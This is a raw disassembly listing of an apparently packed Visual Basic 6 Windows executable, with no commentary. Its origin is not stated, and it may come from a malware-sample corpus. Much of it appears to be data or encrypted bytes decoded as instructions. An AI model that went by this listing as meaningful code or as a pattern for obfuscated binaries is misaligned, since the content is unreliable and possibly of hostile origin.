sub_401158
push es
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
push esi
push 0x47
add [ edx + ebp * 2 ] bh
inc edi
add [ esi ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
pushad
insb
inc edi
add [ ecx ] ch
insb
inc edi
add [ esi ] ah
add [ eax + eax ] dl
add [ eax ] al
add [ eax ] al
fcomp [ ecx - 0x6659ffb9 ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x9004011 ] dl
add [ eax ] eax
add dh bl
insb
inc edi
add ch ah
insb
inc edi
add ch ah
insb
inc edi
add [ ebp + 0x6e ] cl
inc edi
add [ ebp + 0x6e ] ah
inc edi
add bh bl
outsb
inc edi
add [ ecx + 0x6f ] bl
inc edi
add bl dl
outsd
inc edi
add [ eax + esi * 2 ] bl
inc edi
add [ esi + 0x70 ] bl
inc edi
add bh dh
jo r-xdata
inc edi
add [ esi + 0x73 ] ch
add ah bh
jo r-xdata
inc edi
add [ esi - 0x17ffb88a ] ah
add [ esp + esi * 2 + 0x47 ] ch
inc edi
add [ ebx + esi * 2 + 0x73910047 ] cl
inc edi
add [ ecx - 0x2cffb88d ] dl
add ah bh
jo r-xdata
inc edi
add [ ecx - 0x79ffb889 ] al
ja r-xdata
inc edi
add al al
add dh cl
je r-xdata
inc edi
add [ ecx - 0x6effb88d ] dl
jae r-xdata
add [ 0x33004771 ] dl
jno r-xdata
inc edi
add [ ebx + 0x7c ] dh
add ah dl
inc edi
ja r-xdata
add [ esi - 0x3fffb889 ] al
inc edi
add dh bl
ja r-xdata
inc edi
add dh cl
je r-xdata
inc edi
jae r-xdata
add bl dl
inc edi
add [ eax ] bh
jno r-xdata
inc edi
add al dl
jl r-xdata
inc edi
add [ ebp - 0x34ffb884 ] ch
add cl bl
jns r-xdata
inc edi
add dl bh
jns r-xdata
inc edi
add bl ah
ja r-xdata
inc edi
add bh ch
je r-xdata
inc edi
add [ ebp - 0x62ffb887 ] bl
jns r-xdata
jbe r-xdata
add al ch
inc edi
add [ eax ] bh
jno r-xdata
inc edi
add [ edx + eax * 4 - 0x7cc2ffb9 ] ah
add al ch
jg r-xdata
inc edi
add bl ah
jg r-xdata
add al dl
jl r-xdata
jl r-xdata
inc edi
add bl cl
add cl bl
jns r-xdata
inc edi
add [ ebx - 0x67ffb886 ] dl
jpe r-xdata
inc edi
add bl ah
ja r-xdata
inc edi
add [ eax - 0x72ffb88b ] cl
jne r-xdata
inc edi
add [ ebx + 0x7c ] dh
jns r-xdata
add [ esi - 0x2bffb887 ] dh
add [ ecx + 0x74 ] dh
inc edi
add [ ecx + 0x74 ] dh
inc edi
add [ edx + 0x71 ] bh
inc edi
add [ ebx ] dl
jb r-xdata
inc edi
inc edi
add [ ebp - 0x65ffb87c ] dl
test [ edi ] al
0xbb004784 0x4784
add [ ebp + eax * 4 + 0x47 ] dl
add [ ecx - 0x7b ] bl
inc edi
add [ ecx - 0x7b ] bl
inc edi
add [ ebx + 0x34004785 ] bl
xchg [ edi ] al
cmp [ esi - 0x79c6ffb9 ] eax
inc edi
add [ edx - 0x7a ] dl
inc edi
add [ eax - 0x7a ] dh
inc edi
add [ ebp - 0x7a ] dh
inc edi
add [ ebp - 0x7a ] dh
inc edi
add [ esi + 0x2f004786 ] dl
xchg [ edi ] eax
xor al 0x87
inc edi
add [ edi + eax * 4 ] dh
inc edi
add [ ebp - 0x79 ] cl
inc edi
add [ ebx - 0x79 ] ch
inc edi
add [ eax - 0x79 ] dh
inc edi
add [ eax - 0x79 ] dh
inc edi
add [ ecx + 0x2a004787 ] dl
mov [ edi ] al
das
mov [ edi ] al
das
mov [ edi ] al
imul ecx [ eax - 0x7778ffb9 ] 0x888c0047
inc edi
add [ eax + ecx * 4 - 0x7752ffb9 ] cl
inc edi
add [ esi - 0x77 ] al
inc edi
add [ ebx - 0x77 ] cl
inc edi
add [ ebx - 0x77 ] cl
inc edi
add [ ebp - 0x5cffb877 ] al
mov [ edi ] eax
test al 0x89
inc edi
add [ eax - 0x36ffb877 ] ch
mov [ edi ] eax
bound ecx [ edx - 0x7598ffb9 ]
inc edi
add [ edi - 0x76 ] ah
inc edi
add [ ecx + 0x4200478a ] ch
mov eax [ edi ]
inc edi
mov eax [ edi ]
inc edi
mov eax [ edi ]
or [ ebx - 0x7460ffb9 ] 0x8ba40047
inc edi
add [ ebx + ecx * 4 - 0x7419ffb9 ] ah
inc edi
add [ edi - 0x74 ] bh
inc edi
add [ esp + ecx * 4 - 0x737bffb9 ] al
inc edi
add [ ebp - 0x44ffb874 ] bl
mov [ edi ] es
ror [ edi + eax * 2 + 0x478cc000 ] 0x0
add cl [ ebp - 0x7264ffb9 ]
inc edi
add [ eax - 0x5fffb873 ] ah
lea eax [ edi ]
mov dh 0x8d
inc edi
add ah dl
lea eax [ edi ]
test [ edi ] al
cmp eax 0x3d004784
test [ edi ] al
ja r-xdata
inc edi
add [ 0x42004783 ] bh
add al ch
jg r-xdata
add cl dh
jl r-xdata
inc edi
add [ eax - 0x46ffb886 ] bl
jpe r-xdata
inc edi
add [ eax - 0x67ffb886 ] bl
jpe r-xdata
add [ eax + edi * 2 ] al
inc edi
add [ ebp - 0x5dffb888 ] bl
js r-xdata
add [ ebp - 0x54ffb88b ] cl
jne r-xdata
inc edi
add [ ebx - 0x36ffb88c ] ch
add [ eax ] bl
jb r-xdata
inc edi
add [ edx - 0x7d ] al
inc edi
add [ edx - 0x7d ] al
inc edi
add [ ebx - 0x7d ] bl
inc edi
add [ ecx - 0x7d ] bh
inc edi
add [ esi - 0x7d ] bh
inc edi
add [ esi - 0x7d ] bh
inc edi
add [ edi + 0x38004783 ] bl
add [ edi ] 0x42
add [ edi ] 0x5b
add [ edi ] 0x79
add [ edi ] 0x7e
add [ edi ] 0x7e
add [ edi ] 0xffffff9f
add [ edi ] 0x38
add [ edx ] ch
add [ edi ] 0xc3
inc edi
add [ edx - 0x70ffb883 ] cl
jge r-xdata
add [ edi ] 0xc8
inc edi
add bl al
add [ edi - 0x36ffb883 ] cl
inc edi
add [ edx + 0x7b ] dl
inc edi
inc edi
add [ edi - 0x70ffb883 ] cl
jge r-xdata
add [ ecx + 0x5200477a ] bh
jpo r-xdata
inc edi
add [ edx - 0x44ffb888 ] ah
js r-xdata
inc edi
add [ esi + esi * 2 + 0x47 ] al
je r-xdata
inc edi
add cl cl
add [ eax ] bl
jb r-xdata
add [ edi ] 0x2
inc edi
add al cl
add bh ah
jge r-xdata
inc edi
add [ esi - 0x54ffb882 ] ah
jle r-xdata
add [ ebx - 0x2affb885 ] dl
add [ edi ] 0xc8
inc edi
add al cl
jge r-xdata
add cl cl
inc edi
add [ edi + 0x7b ] dl
inc edi
add [ edi + 0x7b ] dl
add cl bl
inc edi
add [ esi - 0x59ffb88a ] ah
jbe r-xdata
inc edi
add [ edx + 0x72 ] dl
inc edi
add [ eax + 0x72 ] dh
inc edi
add [ ebp + 0x72 ] dh
inc edi
add [ ebp + 0x72 ] dh
inc edi
add [ esi + 0x2f004772 ] dl
jae r-xdata
add [ edi ] r-xdata
and eax 0x25004781
inc edi
add [ edx ] al
add ah ch
jge r-xdata
add [ edi ] 0x5d
add [ edi ] 0x62
add [ edi ] 0x62
add [ edi ] 0xa4
add [ edi ] 0x3d
add [ edi ] 0x42
inc edi
add [ eax ] al
add [ edi ] 0x5
add [ edi ] 0x5
add [ ebx - 0x1affb882 ] ch
inc edi
add [ esi + 0x7c ] ch
inc edi
add [ eax + 0x7b ] dh
add dh bl
js r-xdata
inc edi
add [ eax - 0x62ffb887 ] bl
jns r-xdata
inc edi
add [ ebx + 0x44004775 ] ch
jbe r-xdata
add [ ebx + esi * 2 ] dh
inc edi
add [ ebx + esi * 2 ] dh
add [ edi ] 0x3f
inc edi
add [ eax ] ah
add [ edi ] r-xdata
and eax 0x67004781
add [ edi ] r-xdata
add eax 0x5004782
add ah ch
jge r-xdata
inc edi
add [ 0x3f004782 ] al
add [ ebx ] al
jg r-xdata
inc edi
add [ esi - 0x6cffb885 ] cl
jpo r-xdata
add dh bl
js r-xdata
inc edi
add [ ebp - 0x49ffb887 ] bl
jns r-xdata
js r-xdata
inc edi
add [ ebx - 0x26ffb888 ] bh
add [ ecx + 0x76 ] cl
inc edi
add [ ecx + 0x76 ] cl
inc edi
add [ ebx - 0x5effb88a ] al
jbe r-xdata
add [ edi ] r-xdata
add [ edx - 0x7dfaffb9 ] al
inc edi
add [ 0x25004781 ] ah
add [ 0xffffffffa600477e ] cl
jle r-xdata
inc edi
add [ edi ] bh
add [ eax ] cl
jg r-xdata
inc edi
add [ ebx - 0x6cffb885 ] dl
jpo r-xdata
add bh bh
js r-xdata
inc edi
add [ edi - 0x7f ] ah
add [ ebx - 0x54ffb882 ] ch
jle r-xdata
inc edi
add [ ebp - 0x7e ] bl
add [ eax ] cl
jg r-xdata
inc edi
jpo r-xdata
add ch dl
inc edi
add [ 0x5004782 ] al
jle r-xdata
add ch ah
inc edi
add [ edx - 0x7e ] ah
inc edi
add [ edx - 0x7e ] ah
add [ edx + 0x7f ] cl
_start
push r-xdata
call Ordinal_MSVBVM60_100
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ eax ] al
add [ eax ] al
cmp [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ esi - 0x45e16c8a ] al
dec edi
inc edi
mov bl 0xdd
aas
and ch [ esi + ebx * 2 + 0xfa ]
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
inc ecx
add [ esi ] al
push eax
xchg ebx eax
add dl [ edx + 0x65 ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx + 0x40 ] dh
add [ ecx ] al
add [ eax ] bl
add [ esi + 0x40 ] al
add [ eax ] al
outsb
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
adc eax 0x40268400
add [ eax ] al
add [ eax ] al
add bh bh
sub_40184f
inc [ eax ]
add [ eax ] al
add [ eax ] ch
sub eax [ eax ]
inc eax
mov dl 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] ch
jmp r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
sbb [ eax ] al
add [ eax ] eax
add eax [ eax ]
test [ esi ] ah
inc eax
add [ eax ] al
add [ eax ] al
add bh bh
sub_401bcf
inc [ eax ]
add [ eax ] al
add al bl
sub [ eax ] eax
shl [ ecx + 0x47 ] 0x1
add [ eax ] al
clc
in eax dx
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
add [ eax ] al
sub_406aca
push ds
dec ebp
adc ebp [ eax + 0x35 ]
rcl edx cl
adc al al
sbb [ ecx + 0x46 ] 0xffffffac
dec ebx
xchg esp eax
pop ecx
add [ edi ] ebp
dec ebp
pop edx
0xcfec897a 0x669a
sub_4071ce
out dx eax
das
xor [ eax + 0x68c9f076 ] ah
inc edx
pop edx
mov ebp 0x94898099
jno r-xdata
0x4afe
mov dh 0xe4
jmp r-xdata
fidiv [ edx ]
fldenv [ ebx + 0x5a ]
mov eax [ 0xffffffffffff9688 ]
cmp al 0xdc
cmpsd [ esi ] [ edi ]
mul [ eax ]
out 0xf9 al
mov esp 0x2d5cd0b7
push ecx
add al 0x72
aas
loopne r-xdata
push 0xffe5
in al 0xd7
or al ch
aaa
mov esp 0xf65d53f9
daa
rol [ ebp + 0x2fef0e52 ] 0x30
mov al [ 0x68c9f076 ]
loop r-xdata
stc
xchg edx eax
pop edi
mov ecx 0xada73cfc
aas
pushad
or esp [ esi - 0x52 ]
das
sbb ecx [ ecx + 0x67 ]
xor [ ecx - 0x28 ] cl
out 0x7 eax
mov ah 0x81
sub eax 0xc933f6f3
shr ebp cl
jns r-xdata
sub [ esi + 0x1f ] 0x24
test eax 0xb34afcd2
adc al 0xae
sub [ ebx + ebp * 8 ] ch

outsb
mov bl 0x8c
jno r-xdata
out 0xfa al
pop ds
and al 0xa9
sar ah cl
dec edx
mov bl 0x14
scasb [ edi ]
pushad
retn
sub_40f7ca
test al 0xa3
cbw
pop es
sbb [ cs : edx ] ecx
jne r-xdata
sar [ ecx + ecx * 2 ] cl
dec edx
fisubr [ edi + 0x1c ]
sahf
and [ esp + ebx * 2 ] ecx
jecxz r-xdata
aaa
loope r-xdata
mov ebx 0x911cb517
mov dh 0xdc
cmpsb [ esi ] [ edi ]
push edx
inc esp
xor cl [ ebx + 0x6040384d ]
inc esp
lodsb [ esi ]
cmp al 0xd3
inc ecx
inc [ esi ]
aaa
sahf
popad
sub edi edi
xchg ebp eax
leave
sub al [ edi + 0x1fa3732e ]
mov eax [ 0x493cd2d8 ]
push es
dec ebp
add al 0x3b
in eax 0xd0
push eax
adc bh [ es : ebx - 0x6ee34ae9 ]
into
mov ecx 0xc622a9d6
sub_410318
sub ebp [ edi + esi + 0x3f ]
leave
into
inc edx
add bl dh
or [ edi - 0x2f ] bh
and [ ebp + eax * 4 + 0x25 ] edx
push ecx
jns r-xdata
dec ebx
push esp
mov esi 0xd6757f96
stosb [ edi ]
test al 0x89
bound ebx [ 0x5f24fcd8 ]
mov dl 0x5c
retn 0xe50f
sub_414771
jmp r-xdata
mov ch 0x25
nop
pop esp
lodsd [ esi ]
[ ecx + edx * 8 ]
loopne r-xdata
inc ebx
xchg esp eax
xchg [ eax - 0x6fda4a2a ] eax
scasd [ edi ]
inc ebp
jmp 0x69ac335d
sub_41fc48
mov [ 0x168dc5a2 ] al
xor [ edx ] 0x67
fisubr [ ecx + ebp * 2 ]
cli
inc edi
cmp bh bh
dec edi
inc ecx
stosb [ edi ]
add eax 0xa87dd061
and [ ebp - 0x47 ] edx
pop ebx
cmp eax 0x32ff34a3
int3
sub_429f08
push [ 0x6b5e5043 ]
jns r-xdata
or [ edi ] edx
and al 0x32
aas
dec ebp
pop edx
push 0x9e908375
stosd [ edi ]
mov ecx 0xeee1d3c6
cld
or [ edi ] edx
xchg ebx eax
mov eax [ 0x613ec0af ]
jpo r-xdata
and al 0x32
aas
dec ebp
pop esp
imul esi [ edi - 0x7c ] 0xbaada092
enter 0xe3d5 0xf0
dec [ ebx ]
sbb [ esi ] esp
xor eax [ ecx + 0x4e ]
pop esp
imul esi [ edi - 0x7c ] 0xbaad9f92
enter 0xe3d5 0xf0
dec [ ebx ]
sbb [ esi ] ah
xor eax [ ecx + 0x4e ]
pop esp
imul esi [ edi - 0x7c ] 0xbaad9f92
lodsb [ esi ]
sub_42b499
aam 0xdd
in eax 0xee
idiv bh
or [ ecx ] dl
sbb [ edx ] esp
sub dh [ ebx ]
cmp al 0x44
dec ebp
push ebp
pop esi
push 0x8b827a71
xchg esp eax
pushfd
movsd [ edi ] [ esi ]
lodsd [ esi ]
mov dh 0xbf
enter 0xdbd1 0xe3
in al dx
hlt
sub_43036d
dec [ eax + 0x73 ]
xchg [ ebx - 0x6b8f2a49 ] ebx
mov ah 0xd5
clc
pop ss
cmp bl [ ebx + 0x7b ]
cdq
mov ecx 0xdba9b681
std
and [ edx + 0x65 ] al
test [ ebx + 0x2a06e5c4 ] ah
dec edx
push 0xffffff8b
lodsb [ esi ]
int3
sub_439139
out dx eax
sbb al [ ebp + 0x77 ]
cmpsb [ esi ] [ edi ]
aam 0x1
test [ edx - 0xd5c8b23 ] dh
sbb eax 0x7a31794a
test eax 0x79491ae9
stosb [ edi ]
fimul [ edi ]
inc eax
outsd
sahf
iretd
sub_43e57d
outsd
adc [ ebp - 0x1d304357 ] 0xf5
or [ ebx ] bl
inc ecx
push esp
jpe r-xdata
mov al [ 0xffffffffecd9c6b3 ]
call [ ebx ]
cmp [ es : edi + ebx * 2 + 0x73 ] ecx
xchg [ ecx - 0x12253954 ] bl
add [ ebx ] dl
cmp ecx [ es : edi + 0x62 ]
jne r-xdata
adc [ esi - 0x1d304357 ] 0xfffffff5
or [ ebx ] bl
inc edx
push esp
push 0xb6a38e7b
leave
fdivr st0
add edx [ esi ]
sub [ eax + edx * 2 ] edi
arpl [ ebp - 0x78 ] si
pushfd
scasd [ edi ]
retn 0xe8d5
fwait
scasb [ edi ]
rcl esp 0xe7
sti
push cs
and [ edi + eax * 2 ] esi
pop edx
insd
adc [ ebx - 0x2033465a ] 0xf2
add [ eax ] cl
sbb edi edi
sub_44aa47
dec esp
jno r-xdata
push ss
cmp [ edx - 0x5d ] bl
retn
mov dh 0xdc
push es
sub eax 0xc3a27953
out 0xb eax
das
push esp
ja r-xdata
outsb
xchg esp eax
mov dh 0xda
retn 0xde8
sub_44ab09
cmc
pop ss
aas
pop ebx
jg r-xdata
in al 0x6
retn 0x6e4
in al 0xa
sub eax 0xbe9a7553
loopne r-xdata
mov esi 0x4e2707e4
je r-xdata
mov [ eax ] al
scasb [ edi ]
or dh [ 0xffffffffc2a17f5c ]
jecxz r-xdata
and eax 0x886646
jne r-xdata
mov edx 0x442100dc
xchg [ eax + 0x3f1bf9d7 ] bp
arpl [ ebp + 0x13efcda8 ] ax
pop edx
outsd
xor al 0x56
jpe r-xdata
in al 0xbe
out dx al
adc esi [ esi + edx * 2 ]
push ecx
jbe r-xdata
mov esi 0x462502e0
mov edi 0x4d2906e1
outsb
xchg ebx eax
mov ch 0xd6
neg [ eax ]
cmp [ ecx + 0x7a ] bl
cdq
mov edx 0x5023ffdb
mov ecx 0x4c2a06e3
insd
nop
mov ch 0xd8
sti
sbb eax 0xaa85623f
int 0xf1
adc esi [ eax + ebx * 2 ]
jpe r-xdata
sub eax 0x79665340
mov [ edi + 0xfefd0b2 ] ds
das
push eax
jb r-xdata
mov esp 0x502b05e1
jae r-xdata
sub eax 0xc3a27953
out 0xb eax
das
push esp
ja r-xdata
sub [ esi + ebp * 2 - 0x6e ] ecx
mov ch 0xd9
push es
sub ecx [ ebp + 0x6f ]
xchg ebx eax
mov dh 0xd8
sti
sbb al 0x3f
bound eax [ ebp + 0x14f1cca7 ]
aaa
pop ecx
jpo r-xdata
shl esp 0x6
fdivrp st1
add al 0x17
sub bh [ 0xffffffff89766350 ]
fwait
scasb [ edi ]
retn 0xe8d5
mov bl 0xd4
hlt
comiss xmm2 [ eax + 0x72 ]
xchg ebx eax
mov esp 0xffff03e1
outsb
xchg esp eax
mov dh 0xda
retn 0xde8
sub_44da27
sti
push cs
and [ esi + eax * 2 ] esi
pop edx
insd
adc [ edx - 0x71b335b ] 0xb
push ds
xor [ edi + edx * 2 + 0x69 ] eax
jl r-xdata
adc ebp [ eax ]
cmp cl [ ebp + 0x60 ]
jae r-xdata
mov [ 0xffffffffeddbc8b5 ] al
add [ ebx ] dl
cmp [ es : edi + ebx * 2 + 0x71 ] ecx
insb
cdq
add [ eax + 0xfe8d6c3 ] dh
jns r-xdata
test [ edi - 0x1c2f4256 ] dl
test [ eax ] 0x1d
xor [ ebx + 0x56 ] al
imul edi [ edi + ecx * 4 - 0x5e ] 0xeddac8b5
add [ ebx ] bl
cmp bl [ edx + 0x7b ]
0xe8d4c1ae 0xefb
adc esp [ esi ]
cmp [ edi + ebx * 2 + 0x71 ] ecx
cdq
lodsb [ esi ]
mov edi 0xcf8e5d2
pop ds
xor al [ ebp + 0x58 ]
imul edi [ ebp - 0x70 ] 0xffffffa3
mov dh 0xc9
fsub st7
add dl [ 0x604d3b28 ]
jae r-xdata
and [ ebx ] dh
inc esi
pop ecx
cmpsb [ esi ] [ edi ]
mov ecx 0x5f2dfcc
sbb [ esi + edi ] ebp
push ecx
ja r-xdata
sbb edi [ edx ]
pop edx
jpo r-xdata
0xe5d2bfad 0xbf8
push ds
xor [ edi + edx * 2 + 0x6a ] eax
jge r-xdata
push ebx
js r-xdata
movsb [ edi ] [ esi ]
mov bh 0xca
fdivrp st0
add edx [ esi ]
sub [ edi + ecx * 2 ] edi
bound esi [ ebp - 0x78 ]
fwait
scasb [ edi ]
rcl esp 0xe7
stc
or al 0x1f
xor al [ ebp + 0x58 ]
imul edi [ esi - 0x6f ] 0xffffffa4
mov dh 0xc9
fsub st7
add dl [ 0x75614c28 ]
mov [ edi + ebp * 4 - 0x5182b3f ] bl
or eax 0x59463320
insb
jg r-xdata
insb
jle r-xdata
popfd
scasd [ edi ]
retn 0xe8d5
adc eax 0xffffff28
and [ edi + eax * 2 ] esi
pop edx
insd
xchg ebx eax
mov bh 0xcc
fcomip st2
add al 0x17
sub bh [ 0xffffffff89766350 ]
scasb [ edi ]
rcl esp 0xe8
sti
push cs
fwait
scasb [ edi ]
rcl esp 0xe7
cli
or eax 0x5a473520
insd
adc [ ebx - 0x2033465a ] 0xf1
add al 0x17
sub bh [ 0xffffffff89756350 ]
fwait
push eax
arpl [ esi - 0x77 ] si
movsb [ edi ] [ esi ]
mov bh 0xcc
fcomip st2
sbb [ edx ] bh
frstor [ eax - 0x23 ]
mov esi 0x58330fe7
jge r-xdata
cmp [ ebx + 0x5e ] cl
jno r-xdata
sahf
mov dl 0xc5
fsubr st3
pop eax
imul edi [ esi - 0x6f ] 0xffffffa4
mov dh 0xc9
fsub st7
add [ edi ] edx
cmp cl [ ebp + 0x60 ]
jb r-xdata
movsb [ edi ] [ esi ]
mov bh 0xca
add [ edx - 0x14273b ] dh
adc ah [ 0x715e4b38 ]
test [ eax - 0x1b2e4155 ] ebx
test [ ecx ] 0x76532f1c
mov fs [ edx - 0x1225374b ]
add [ 0x604e3b28 ] dl
jae r-xdata
out dx al
adc [ edx ] dh
xchg edi eax
stosb [ edi ]
mov ebp 0x8f5e2cf
sbb ebp [ esi ]
inc ecx
push esp
jpe r-xdata
nop
movsb [ edi ] [ esi ]
mov bh 0xca
cwde
stosd [ edi ]
mov esi 0xaf7e4d1
sbb eax 0x6c564330
shr dl 0xc
sub eax 0xba96724f
sbb [ ebx ] bh
pop edi
and [ ebp + 0x300deac7 ] 0xbb987653
fiadd [ eax ]
pop ds
inc ebx
mov [ si - 0x729 ] esi
sbb [ 0xffffffffc7a5805e ] edi
out 0x8 eax
sub [ esi + ebp * 2 - 0x6c ] ecx
mov bh 0xdc
jmp [ edx ]
mov al [ 0xffffffffecd9c6b3 ]
call [ ecx ]
and al 0x37
dec ebp
pushad
jae r-xdata
0x7653300d 0xbb98
cdq
lodsb [ esi ]
mov edi 0x2611ebd2
cmp [ edi + ebx * 2 + 0x71 ] ecx
test [ edi - 0x1d2f4256 ] dl
cmc
or [ ebx ] bl
inc eax
push ebx
jns r-xdata
inc ebp
insd
xchg ecx eax
mov ah 0xd8
cld
and [ eax + ebp * 2 - 0x73 ] eax
mov al 0xd4
neg [ esi + edi ]
push 0xffffff91
mov ch 0xd9
std
and [ ebx + 0x69 ] al
lea esi [ ecx + 0x441ffbd6 ]
imul ecx [ esi + 0x2dd00b4 ] 0x97714d26
mov ebx 0x502c05e1
je r-xdata
sahf
mov cl 0xc4
xlat
push ebp
js r-xdata
mov esp 0xff3106e2
pushfd
retn 0xecd8
sub_44dafe
pushfd
scasd [ edi ]
shl esp cl
adc esi [ esi ]
pop ebx
jns r-xdata
fwait
mov eax [ 0xffffffffeddac7b4 ]
add [ eax ] al
pop ss
sub bh [ 0xffffffffbd9a7959 ]
in al 0x6
sub [ esi + 0x59 ] eax
outsd
adc [ ebp - 0x7294458 ] 0x18
cmp [ ecx + 0x7f ] ebx
cwde
stosd [ edi ]
adc esp [ esi ]
cmp [ edi + ebx * 2 + 0x71 ] ecx
test [ edi - 0x1c2f4256 ] dl
test [ eax ] 0x1d
xor [ ebx + 0x56 ] al
imul edi [ edi + ecx * 4 - 0x5e ] 0xeddac8b5
add [ ebx ] bl
cmp bl [ edx + 0x7b ]
0xe8d4c1ae 0xefb
cdq
lodsb [ esi ]
mov edi 0xcf8e5d2
pop ds
xor al [ ebp + 0x58 ]
imul edi [ ebp - 0x70 ] 0xffffffa3
mov dh 0xc9
fsub st7
add dl [ 0x604d3b28 ]
jae r-xdata
sbb edi [ edx ]
pop edx
jpo r-xdata
0xe5d2bfad 0xbf8
push ds
xor [ edi + edx * 2 + 0x6a ] eax
jge r-xdata
adc eax 0xffffff28
and [ edi + eax * 2 ] esi
pop edx
insd
xchg ebx eax
mov bh 0xcc
fcomip st2
add al 0x17
sub bh [ 0xffffffff89766350 ]
scasb [ edi ]
rcl esp 0xe8
sti
push cs
fwait
scasb [ edi ]
rcl esp 0xe7
cli
or eax 0x5a473520
insd
adc [ ebx - 0x2033465a ] 0xf1
add al 0x17
sub bh [ 0xffffffff89756350 ]
push eax
arpl [ esi - 0x77 ] si
movsb [ edi ] [ esi ]
mov bh 0xcc
fcomip st2
sbb [ edx ] bh
frstor [ eax - 0x23 ]
mov esi 0x58330fe7
jge r-xdata
add [ edx - 0x14273b ] dh
adc ah [ 0x715e4b38 ]
test [ eax - 0x1b2e4155 ] ebx
test [ ecx ] 0x76532f1c
mov fs [ edx - 0x1225374b ]
add [ 0x604e3b28 ] dl
jae r-xdata
sub_45ba09
push ecx
pop edi
outsd
jle r-xdata
fucomp st3
cli
or [ edi ] edx
xor al 0x43
push edx
pushad
outsd
jle r-xdata
mov al 0xbe
int 0xdc
jmp r-xdata
fwait
test eax 0xf9e9d2b8
or [ esi ] dl
and eax 0x60514234
outsb
jge r-xdata
popfd
sahf
lodsb [ esi ]
mov ebx 0xf5e7d8ca
add al 0x12
0xd4c6b7a8 0xf1e3
add [ esi ] cl
sbb eax 0x58493a2c
jne r-xdata
xchg [ esi - 0x2d3b4a5c ] edx
loope r-xdata
cwde
cmpsd [ esi ] [ edi ]
mov ch 0xc4
shl cl cl
out dx eax
add [ eax ] esp
cmp [ edx + 0x6c ] dl
mov [ ecx - 0x29384858 ] ebx
and [ eax ] eax
xor al [ ecx + 0x4f ]
pop esi
insb
jpo r-xdata
xchg ebx eax
mov [ 0xffffffffddcec0b1 ] al
jmp r-xdata
adc esp [ edx ]
xor [ edi ] bh
dec [ 0x5e392a1b ]
insd
jl r-xdata
mov [ esi - 0x2d3b4a5a ] dl
loopne r-xdata
fwait
test eax 0xe4d5c7b8
add [ edi ] ecx
push ds
sub al 0x3b
dec ecx
pop eax
jne r-xdata
mov cl 0xc0
into
fucomp st3
cli
or [ edi ] edx
xor al 0x43
push edx
pushad
outsd
jle r-xdata
mov eax 0xf4e5d5c6
add dl [ ecx ]
and [ esi ] ch
cmp eax 0x77695a4b
0xd4c5b7a8 0xf1e2
dec [ esi ]
sbb al 0x2b
cmp [ eax + 0x56 ] ecx
jae r-xdata
add eax 0x3f312214
dec esi
pop esp
imul edi [ ecx - 0x78 ] 0xffffff96
cmpsb [ esi ] [ edi ]
mov ch 0xc4
shl al cl
out dx eax
dec [ ebx + ebx ]
sub [ eax ] edi
inc esi
xchg edx eax
mov [ 0xffffffffddcebfb1 ] al
jmp r-xdata
in eax 0xf3
add dl [ ecx ]
pop ds
cmp eax 0x77695a4c
xchg [ ebp - 0x303e4d5c ] dl
fsubp st4
sti
or [ eax ] ebx
daa
xor eax 0x6f615244
jle r-xdata
fwait
test eax 0xe4d5c6b8
add [ eax ] edx
push ds
sub eax 0x67584a3b
jbe r-xdata
mov cl 0xc0
into
fucomp st3
cli
or [ edi ] dl
xor al 0x43
push ecx
pushad
outsd
mov [ ebp + esi * 4 - 0x101f2d3d ] ah
dec [ 0x47382a1b ]
push ebp
jb r-xdata
xchg [ ebx - 0x22313f4f ] dl
jmp r-xdata
cmp eax 0x77695a4b
xchg ecx eax
lahf
scasb [ edi ]
mov esp 0xf7e8d9cb
mov cl 0xbf
into
imul esi [ edi - 0x7a ] 0xc1b2a495
iretd
xchg ebx eax
mov [ 0xffffffffdccdbfb0 ] al
0x251708f9 0x4234
mov ah 0xc3
shl eax 0x1
out dx al
std
or ebx [ edx ]
sub [ edi ] dh
inc ebp
push esp
bound esi [ ecx + 0x7f ]
mov ds [ ebx + ebp * 4 - 0x1a293747 ]
add dl [ ecx ]
and [ esi ] ch
cmp eax 0x79695a4b
nop
sahf
lodsd [ esi ]
mov ebx 0xf7e9daca
push es
adc al 0x23
xor al [ eax + 0x4f ]
pop ebp
insb
jpo r-xdata
jpe r-xdata
movsd [ edi ] [ esi ]
retn
mov ah [ ebx + 0x9f0d7bf ]
and [ esi + edx * 2 ] edi
cmp eax 0x79695a4b
cwde
cmpsd [ esi ] [ edi ]
mov ch 0xc4
shl ecx cl
[ 0x47392a1c ]
push esi
jae r-xdata
xchg edi eax
cmpsb [ esi ] [ edi ]
mov ah 0xc3
shl al cl
out dx eax
std
or al 0x1a
sub [ eax ] edi
inc esi
push ebp
jb r-xdata
cwde
cmpsb [ esi ] [ edi ]
mov ch 0xc3
shl cl cl
out dx eax
dec [ ebx + ebx ]
sub [ eax ] edi
inc esi
push ebp
arpl di di
jno r-xdata
[ ecx ] esp
cmp al 0x56
dec ebp
pop esp
push 0x79
nop
lahf
lodsd [ esi ]
mov esp 0xf6e8d9cb
add eax 0x3f302213
xor eax 0x6f605243
jge r-xdata
scasb [ edi ]
mov esp 0xf7e8dacb
add eax 0x3f312214
fwait
test eax 0xe3d5c6b8
add [ edi ] cl
push ds
sub al 0x3b
dec ecx
pop eax
jne r-xdata
dec esi
pop esp
imul edi [ edx - 0x78 ] 0xffffff97
movsd [ edi ] [ esi ]
mov bl 0xc2
rcr bh 0x1
in eax dx
cld
or bl [ edx ]
sub [ eax ] edi
inc esi
push ebp
arpl [ edx - 0x80 ] si
xor [ edi ] edi
xchg edx eax
mov eax [ 0xffffffffdccdbfb0 ]
jmp r-xdata
sub_4656c1
sti
push cs
and [ edi + eax * 2 ] esi
pop edx
insd
adc [ edx - 0x2133475a ] 0xf1
add al 0x17
sub edi [ esi ]
push eax
arpl [ esi - 0x77 ] si
pushfd
scasd [ edi ]
retn 0xe8d5
sub_4697ca
cmp eax 0xe9b80c04
inc ecx
